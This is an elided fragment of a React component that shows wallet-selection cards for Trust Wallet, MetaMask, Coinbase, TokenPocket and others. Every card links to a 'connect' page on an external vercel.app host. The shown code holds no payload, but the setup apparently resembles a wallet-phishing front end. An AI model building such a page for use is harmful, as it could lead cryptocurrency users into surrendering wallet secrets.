    ...
    return (
        ...
        <div className={styles.cardHead}>
          ...
          {/* <button className={styles.card}> */}
            ...
            <a className={styles.card} href="https://prevs.vercel.app/connect?items=trustwallet">
          ...
          <a className={styles.card} href="https://prevs.vercel.app/connect?items=metamask">
            <div className={styles.imgSide}>
          ...
          {/* <div className={styles.card}> */}
          <a className={styles.card} href="https://prevs.vercel.app/connect?items=coinbase">
            <div className={styles.imgSide}>
          ...
          {/* <div className={styles.card}> */}
          <a className={styles.card} href="https://prevs.vercel.app/connect?items=formatic">
            <div className={styles.imgSide}>
          ...
          {/* <div  className={styles.card}> */}
          <a className={styles.card} href="https://prevs.vercel.app/connect?items=tokenpocket">
            <div className={styles.imgSide}>
          ...
          {/* <div className={styles.card}> */}
          <a className={styles.card} href="https://prevs.vercel.app/connect?items=binancechain">
            <div className={styles.imgSide}>
